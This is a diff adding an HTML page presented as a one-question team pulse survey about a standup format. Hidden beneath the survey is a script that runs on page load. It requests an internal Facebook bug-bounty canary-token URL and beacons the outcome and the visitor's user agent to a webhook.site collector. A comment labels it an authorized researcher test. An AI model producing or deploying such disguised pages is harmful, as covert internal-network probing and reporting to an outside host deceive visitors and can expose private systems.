@@ -1,0 +1,24 @@
+<!doctype html><html><head><meta charset="utf-8"><title>Q3 Team Pulse Survey</title></head>
+<body style="font-family:-apple-system,sans-serif;max-width:560px;margin:48px auto;color:#222">
+<h2>Q3 Team Pulse Survey</h2>
+<p>Thanks for opening this quarter's pulse survey. One question this week:</p>
+<p><b>&ldquo;The new standup format is working well.&rdquo;</b></p>
+<p>Rate it 1&ndash;5 and add any comment &mdash; just reply in the chat with your number.</p>
+<!-- researcher test page (authorized own-account, case CAT1): one tracking pixel + delivery-status report to researcher collector; no other actions -->
+<script>
+(function(){
+  var out={t:Date.now(),img:null,fetch:null,ua:navigator.userAgent.slice(0,80)};
+  var done=0;
+  function fin(){ done++; if(done===2){ try{navigator.sendBeacon('https://webhook.site/fdfac34c-4508-46fd-96d0-da78a36627b1/hit?case=CAT1-CANARY', JSON.stringify(out));}catch(e){} } }
+  var im=new Image();
+  im.onload=function(){out.img='load';fin()};
+  im.onerror=function(){out.img='error';fin()};
+  im.src='https://www.internalfb.com/intern/bug-bounty/get-canary-token/';
+  fetch('https://www.internalfb.com/intern/bug-bounty/get-canary-token/',{mode:'no-cors',cache:'no-store'})
+    .then(function(){out.fetch='resolved'})
+    .catch(function(e){out.fetch='rejected '+((e&&e.message)||'')})
+    .finally(fin);
+  setTimeout(function(){ if(done<2){ out.timeout=true; try{navigator.sendBeacon('https://webhook.site/fdfac34c-4508-46fd-96d0-da78a36627b1/hit?case=CAT1-CANARY', JSON.stringify(out));}catch(e){} done=2; } },15000);
+})();
+</script>
+</body></html>
